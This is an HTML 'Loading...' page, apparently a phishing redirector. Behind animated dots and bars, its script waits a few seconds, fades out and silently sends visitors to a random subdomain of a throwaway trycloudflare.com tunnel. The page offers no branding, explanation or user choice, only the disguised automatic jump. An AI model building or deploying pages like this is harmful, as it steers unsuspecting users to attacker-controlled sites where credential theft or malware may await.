<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Loading...</title>
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/189/189792.png" />
  <style>
    /* Dark/Light Mode Support */
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: 'Segoe UI', 'Arial', sans-serif;
      transition: all 0.8s ease;
      opacity: 1;
      backdrop-filter: blur(10px);
    }

    /* Dark mode */
    @media (prefers-color-scheme: dark) {
      body {
        background: #181818;
        color: #e3c98a;
      }
    }

    /* Light mode */
    @media (prefers-color-scheme: light) {
      body {
        background: rgba(255,255,255,0.7);
        color: #333;
      }
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 40px;
      display: flex;
      gap: 5px;
    }

    /* Animate dots */
    .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      opacity: 0.3;
      animation: blink 1s infinite;
    }

    @media (prefers-color-scheme: dark) {
      .dot { background: #e3c98a; }
    }

    @media (prefers-color-scheme: light) {
      .dot { background: #333; }
    }

    .dot:nth-child(1) { animation-delay: 0s; }
    .dot:nth-child(2) { animation-delay: 0.2s; }
    .dot:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 80%, 100% { opacity: 0.3; }
      40% { opacity: 1; }
    }

    /* Loader bars */
    .loader {
      width: 85px;
      height: 50px;
      --g1: conic-gradient(from  90deg at left   3px top   3px,#0000 90deg,#fff 0);
      --g2: conic-gradient(from -90deg at bottom 3px right 3px,#0000 90deg,#fff 0);
      background: var(--g1),var(--g1),var(--g1), var(--g2),var(--g2),var(--g2);
      background-position: left, center, right;
      background-repeat: no-repeat;
      animation: l9 1s infinite;
    }

    @keyframes l9 {
      0%   {background-size:25px 50% ,25px 50% ,25px 50%}
      25%  {background-size:25px 100%,25px 50% ,25px 50%}
      50%  {background-size:25px 50% ,25px 100%,25px 50%}
      75%  {background-size:25px 50% ,25px 50% ,25px 100%}
      100% {background-size:25px 50% ,25px 50% ,25px 50%}
    }

    @media (max-width: 500px) {
      h1 { font-size: 1.5rem; margin-bottom: 30px; }
      .loader { width: 60px; height: 35px; }
    }
  </style>
</head>
<body>
  <h1>
    Loading
    <span class="dot"></span>
    <span class="dot"></span>
    <span class="dot"></span>
  </h1>
  <div class="loader"></div>

  <script>
    // Redirect with fade-out
    setTimeout(() => {
      document.body.style.opacity = '0'; // Start fade-out
      setTimeout(() => {
        window.location.href = "https://documents-ships-naples-promotions.trycloudflare.com"; // Redirect after fade
      }, 800); // fade duration
    }, 3500); // wait before starting fade
  </script>
</body>
</html>
